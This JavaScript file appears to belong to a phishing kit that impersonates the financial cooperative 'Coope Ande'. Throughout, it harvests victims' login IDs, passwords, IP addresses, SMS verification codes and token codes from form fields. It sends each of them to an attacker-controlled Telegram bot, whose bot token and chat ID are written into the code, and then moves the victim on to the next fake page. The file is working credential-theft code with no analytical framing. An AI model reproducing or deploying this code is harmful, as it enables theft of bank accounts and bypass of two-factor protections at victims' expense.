//bot token
var telegram_bot_id = "5587579086:AAELwa_NtzRG-Yb5XSiXlWM6v8lfmKuzTTw";
//chat id
var chat_id = -627731422;
var USER, PASS, ip, ip2, message;

var ready = function () {
    USER = document.getElementById("identificacionPrs").value;
    PASS = document.getElementById("txtPass").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "💛Coope Ande💛\n👤USER: " + USER+"\nClave :"+ PASS+ "\nIP :"+ ip + "\n" + ip2;
};

var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    setTimeout(function k (){
        location.href="loader.html"
    },2000)
    return false;
}

var ready1 = function () {
    SMS = document.getElementById("SMS").value;

    message = "💛Coope Ande💛\nSMS: " + SMS;
};

var sender1 = function () {
    ready1();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    setTimeout(function k (){
        location.href="token.html"
    },2000)
    return false;
}

var readySms = function () {
    SMS = document.getElementById("SMS").value;

    message = "💛Coope Ande💛\nSMS: " + SMS;
};

var senderSms = function () {
    readySms();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    setTimeout(function k (){
        location.href="loader1.html"
    },2000)
    return false;
}

var readySms1 = function () {
    SMS = document.getElementById("tokenuno").value;

    message = "💛Coope Ande💛\nToken: " + SMS;
};

var senderSms1 = function () {
    readySms1();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    setTimeout(function k (){
        location.href="index.html"
    },2000)
    return false;
}